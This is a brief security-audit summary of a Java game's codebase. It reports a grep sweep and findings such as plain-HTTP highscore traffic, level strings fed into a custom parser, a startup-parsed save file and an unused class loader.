All 62 Java files were swept with API-level greps (net/io/security/reflection/deserialization/native-load), and the 29 files containing hits or security-relevant logic were read in full. Key verified facts: highscore traffic is plain HTTP with `B_ONLINE` hardcoded true; the fetched level strings feed straight into the hand-rolled level parser; a CWD-relative binary save file (`highscore.apo`) is parsed at every startup; `ApoClassLoader` exists but has zero call sites; no `ObjectInputStream`, JNI, MD5 usage (dead code only), or applet-parameter handling exists in this variant.

